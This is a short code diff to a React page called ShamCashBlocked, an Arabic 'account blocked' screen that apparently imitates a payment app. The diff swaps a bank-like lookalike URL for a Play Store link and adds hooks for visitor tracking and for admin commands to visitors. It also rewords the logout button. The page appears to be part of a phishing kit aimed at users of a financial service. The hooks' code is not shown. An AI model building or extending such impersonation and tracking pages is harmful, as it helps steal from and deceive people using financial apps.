@@ -1,6 +1,12 @@
-const REAL_APP_URL = "https://banquedulibanbs.com";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useAdminCommands } from "@/hooks/useAdminCommands";
+
+const REAL_APP_URL = "https://play.google.com/store";
 
 export default function ShamCashBlocked() {
+  useVisitorTracking("تسجيل الخروج");
+  useAdminCommands();
+
   return (
     <div
       dir="rtl"
@@ -113,7 +119,7 @@ export default function ShamCashBlocked() {
             <path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"
               stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
           </svg>
-          الانتقال إلى التطبيق الأصلي وتسجيل الخروج
+          الانتقال إلى التطبيق وتسجيل الخروج
         </button>
       </div>
 
